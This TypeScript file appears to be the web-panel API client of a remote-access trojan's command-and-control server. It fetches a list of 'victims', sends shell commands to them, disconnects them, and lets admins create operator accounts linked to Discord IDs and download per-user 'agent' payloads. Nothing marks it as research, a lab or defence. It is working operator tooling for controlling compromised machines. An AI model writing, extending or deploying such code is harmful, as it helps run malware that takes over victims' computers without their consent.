import type { Victim } from "./types";

const getApiUrl = () => process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:8080";

function buildHeaders(token?: string): Record<string, string> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (token) headers["Authorization"] = `Bearer ${token}`;
  return headers;
}

export async function getVictims(token?: string): Promise<Victim[]> {
  const res = await fetch(`${getApiUrl()}/api/victims`, {
    cache: "no-store",
    headers: buildHeaders(token),
  });
  if (!res.ok) throw new Error("Failed to fetch victims");
  return res.json();
}

export async function sendCommand(
  victimId: string,
  command: string,
  token?: string,
  commandType: string = "shell"
): Promise<void> {
  const res = await fetch(
    `${getApiUrl()}/api/victims/${encodeURIComponent(victimId)}/command`,
    {
      method: "POST",
      headers: buildHeaders(token),
      body: JSON.stringify({ command, command_type: commandType }),
    }
  );
  if (!res.ok) throw new Error("Failed to send command");
}

export async function disconnectVictim(
  victimId: string,
  token?: string
): Promise<void> {
  const res = await fetch(
    `${getApiUrl()}/api/victims/${encodeURIComponent(victimId)}/disconnect`,
    {
      method: "POST",
      headers: buildHeaders(token),
    }
  );
  if (!res.ok) throw new Error("Failed to disconnect");
}

// ── Admin API ──

export interface ManagedUser {
  id: string;
  username: string;
  role: string;
  discord_id: string;
  enrollment_token: string;
  active: boolean;
  created_at: string;
}

export interface CreateUserResponse {
  user: ManagedUser;
  password: string;
}

export async function createUser(
  discordId: string,
  token: string
): Promise<CreateUserResponse> {
  const res = await fetch(`${getApiUrl()}/api/admin/users`, {
    method: "POST",
    headers: buildHeaders(token),
    body: JSON.stringify({ discordId: discordId }),
  });
  if (!res.ok) {
    await res.json().catch(() => ({}));
    throw new Error("Failed to create user");
  }
  return res.json();
}

export async function getUsers(token: string): Promise<ManagedUser[]> {
  const res = await fetch(`${getApiUrl()}/api/admin/users`, {
    headers: buildHeaders(token),
  });
  if (!res.ok) throw new Error("Failed to fetch users");
  const data = await res.json();
  return data.users ?? [];
}

export async function downloadAgent(
  userId: string,
  token: string
): Promise<Blob> {
  const res = await fetch(
    `${getApiUrl()}/api/admin/users/${encodeURIComponent(userId)}/agent`,
    { headers: buildHeaders(token) }
  );
  if (!res.ok) throw new Error("Failed to download agent");
  return res.blob();
}

export async function downloadMyAgent(token: string): Promise<Blob> {
  const res = await fetch(`${getApiUrl()}/api/me/agent`, {
    headers: buildHeaders(token),
  });
  if (!res.ok) throw new Error("Failed to download agent");
  return res.blob();
}
